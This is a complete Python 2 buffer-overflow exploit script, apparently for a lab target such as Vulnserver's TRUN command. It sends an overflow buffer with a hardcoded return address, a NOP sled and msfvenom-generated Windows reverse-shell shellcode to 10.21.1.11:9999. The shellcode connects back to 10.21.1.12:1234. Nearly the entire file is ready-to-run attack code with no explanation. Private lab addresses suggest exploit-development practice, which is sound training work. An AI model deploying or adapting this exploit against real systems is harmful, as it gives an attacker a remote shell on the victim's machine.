#!/usr/bin/python
import sys, socket

ip = '10.21.1.11'
port = 9999

# msfvenom code comes later

fuzz="A"*2003
ret= "\xaf\x11\x50\x62"
nop="\x90"*16

# msfvenom -p windows/shell_reverse_tcp LHOST=10.21.1.12 LPORT=1234 -b '\x00' -f python -v shellcode

shellcode =  b""
shellcode += b"\xbe\xd5\xa4\xdd\xf0\xda\xc7\xd9\x74\x24\xf4"
shellcode += b"\x5d\x29\xc9\xb1\x52\x31\x75\x12\x03\x75\x12"
shellcode += b"\x83\x10\xa0\x3f\x05\x66\x41\x3d\xe6\x96\x92"
shellcode += b"\x22\x6e\x73\xa3\x62\x14\xf0\x94\x52\x5e\x54"
shellcode += b"\x19\x18\x32\x4c\xaa\x6c\x9b\x63\x1b\xda\xfd"
shellcode += b"\x4a\x9c\x77\x3d\xcd\x1e\x8a\x12\x2d\x1e\x45"
shellcode += b"\x67\x2c\x67\xb8\x8a\x7c\x30\xb6\x39\x90\x35"
shellcode += b"\x82\x81\x1b\x05\x02\x82\xf8\xde\x25\xa3\xaf"
shellcode += b"\x55\x7c\x63\x4e\xb9\xf4\x2a\x48\xde\x31\xe4"
shellcode += b"\xe3\x14\xcd\xf7\x25\x65\x2e\x5b\x08\x49\xdd"
shellcode += b"\xa5\x4d\x6e\x3e\xd0\xa7\x8c\xc3\xe3\x7c\xee"
shellcode += b"\x1f\x61\x66\x48\xeb\xd1\x42\x68\x38\x87\x01"
shellcode += b"\x66\xf5\xc3\x4d\x6b\x08\x07\xe6\x97\x81\xa6"
shellcode += b"\x28\x1e\xd1\x8c\xec\x7a\x81\xad\xb5\x26\x64"
shellcode += b"\xd1\xa5\x88\xd9\x77\xae\x25\x0d\x0a\xed\x21"
shellcode += b"\xe2\x27\x0d\xb2\x6c\x3f\x7e\x80\x33\xeb\xe8"
shellcode += b"\xa8\xbc\x35\xef\xcf\x96\x82\x7f\x2e\x19\xf3"
shellcode += b"\x56\xf5\x4d\xa3\xc0\xdc\xed\x28\x10\xe0\x3b"
shellcode += b"\xfe\x40\x4e\x94\xbf\x30\x2e\x44\x28\x5a\xa1"
shellcode += b"\xbb\x48\x65\x6b\xd4\xe3\x9c\xfc\xd1\xe6\x9f"
shellcode += b"\xf0\x8d\x0a\x9f\x0c\x9c\x82\x79\x66\x30\xc3"
shellcode += b"\xd2\x1f\xa9\x4e\xa8\xbe\x36\x45\xd5\x81\xbd"
shellcode += b"\x6a\x2a\x4f\x36\x06\x38\x38\xb6\x5d\x62\xef"
shellcode += b"\xc9\x4b\x0a\x73\x5b\x10\xca\xfa\x40\x8f\x9d"
shellcode += b"\xab\xb7\xc6\x4b\x46\xe1\x70\x69\x9b\x77\xba"
shellcode += b"\x29\x40\x44\x45\xb0\x05\xf0\x61\xa2\xd3\xf9"
shellcode += b"\x2d\x96\x8b\xaf\xfb\x40\x6a\x06\x4a\x3a\x24"
shellcode += b"\xf5\x04\xaa\xb1\x35\x97\xac\xbd\x13\x61\x50"
shellcode += b"\x0f\xca\x34\x6f\xa0\x9a\xb0\x08\xdc\x3a\x3e"
shellcode += b"\xc3\x64\x4a\x75\x49\xcc\xc3\xd0\x18\x4c\x8e"
shellcode += b"\xe2\xf7\x93\xb7\x60\xfd\x6b\x4c\x78\x74\x69"
shellcode += b"\x08\x3e\x65\x03\x01\xab\x89\xb0\x22\xfe"

buffer = fuzz + ret + nop + shellcode

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,port))
    s.send(('TRUN /.:/' + buffer))
    print "[+] Sending buffer, check shell"
    s.close()
except:
    print "[-] Failed!"
    sys.exit()
